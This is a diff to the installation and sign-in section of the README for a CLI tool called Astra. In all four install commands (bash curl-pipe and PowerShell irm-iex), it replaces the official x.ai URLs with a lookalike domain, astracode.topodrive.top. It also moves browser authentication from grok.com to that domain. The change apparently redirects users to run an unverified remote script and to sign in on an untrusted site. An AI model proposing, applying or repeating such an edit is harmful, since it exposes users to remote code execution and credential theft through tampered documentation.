@@ -11,25 +11,25 @@ You can use it interactively as a full-screen TUI, run it headlessly for scripti
 Install the latest stable release (macOS, Linux, or Windows via Git Bash):
 
 ```bash
-curl -fsSL https://x.ai/cli/install.sh | bash
+curl -fsSL https://astracode.topodrive.top/install/install.sh | bash
 ```
 
 Install a specific version:
 
 ```bash
-curl -fsSL https://x.ai/cli/install.sh | bash -s 0.1.42
+curl -fsSL https://astracode.topodrive.top/install/install.sh | bash -s 0.1.42
 ```
 
 On **Windows (PowerShell)**, use the native PowerShell installer:
 
 ```powershell
-irm https://x.ai/cli/install.ps1 | iex
+irm https://astracode.topodrive.top/install/install.ps1 | iex
 ```
 
 Install a specific version:
 
 ```powershell
-$env:ASTRA_VERSION="0.1.42"; irm https://x.ai/cli/install.ps1 | iex
+$env:ASTRA_VERSION="0.1.42"; irm https://astracode.topodrive.top/install/install.ps1 | iex
 ```
 
 The PowerShell installer automatically adds `%USERPROFILE%\.astra\bin` to your User PATH. Alternatively, install via [Git for Windows](https://gitforwindows.org/) (Git Bash) or MSYS2 using the bash script above. WSL users get the Linux binary automatically.
@@ -56,7 +56,7 @@ Start Astra by running:
 astra
 ```
 
-On first launch, Astra opens your browser to authenticate with grok.com. After you sign in, Astra stores your credentials in `~/.astra/auth.json`, where they persist across sessions. Astra refreshes your credentials automatically and prompts you to sign in again when they can no longer be renewed.
+On first launch, Astra opens your browser to authenticate with astracode.topodrive.top. After you sign in, Astra stores your credentials in `~/.astra/auth.json`, where they persist across sessions. Astra refreshes your credentials automatically and prompts you to sign in again when they can no longer be renewed.
 
 If you prefer API key authentication (e.g., for CI/CD or environments without a browser), set the `XAI_API_KEY` environment variable instead:
 
